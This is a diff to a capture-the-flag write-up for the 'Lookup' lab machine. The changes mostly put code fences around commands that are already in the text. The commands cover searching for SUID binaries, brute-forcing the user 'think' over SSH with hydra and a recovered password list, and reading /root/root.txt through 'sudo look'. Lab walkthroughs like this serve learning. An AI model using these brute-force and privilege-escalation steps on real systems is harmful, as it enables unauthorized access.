@@ -37,19 +37,23 @@ Lets see the available users : we see there is user root and think
 There is a .passwords file here, which might be interesting, but we don’t have the permission to read it.
 
 Let’s search for SUID binaries:
-
+```bash
 find / -perm /4000 2>/dev/null
-
+```
 ![image](https://github.com/user-attachments/assets/6bec9d14-9965-47b6-9013-36054366e0d2)
 Bingo, we tricked the binary into extracting “think” as the username, and we got back what seems to be a password list!
 Let’s save that list to a file on our kali and try brute-forcing “think”
-
+```bash
 hydra -l think -P usr_think.txt ssh://lookup.thm
-
+```
 login using ssh
+```bash
 ssh think@lookup.thm   
-
-to access root we use sudo look '' /root/root.txt
+```
+to access root we use
+```bash
+sudo look '' /root/root.txt
+```
 
 
 
